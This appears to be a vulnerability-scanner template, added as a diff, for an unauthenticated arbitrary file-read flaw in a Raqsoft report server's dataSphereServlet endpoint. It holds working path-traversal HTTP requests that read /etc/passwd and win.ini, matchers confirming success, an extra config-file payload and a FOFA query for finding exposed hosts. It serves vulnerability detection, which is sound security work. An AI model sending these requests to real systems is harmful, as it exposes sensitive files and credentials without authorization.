@@ -1,0 +1,44 @@
+id: raqsoft-servlet-dataSphereServlet-fileread
+
+info:
+  name: 润乾报表 servlet/dataSphereServlet - fileread
+  author: leadlife
+  severity: high
+  description: 润乾报表 dataSphereServlet 接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞读取系统内部敏感文件，获取敏感信息。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    tips: other payload /WEB-INF/raqsoftConfig.xml
+    fofa-query: body="/raqsoft"
+  tags: raqsoft, fileread
+
+http:
+  - raw:
+      - |
+        POST /servlet/dataSphereServlet?action=11 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        path=../../../../../../../../../../../windows/win.ini&content=&mode=
+    
+      - |
+        POST /servlet/dataSphereServlet?action=11 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        path=../../../../../../../../../../../etc/passwd&content=&mode=
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
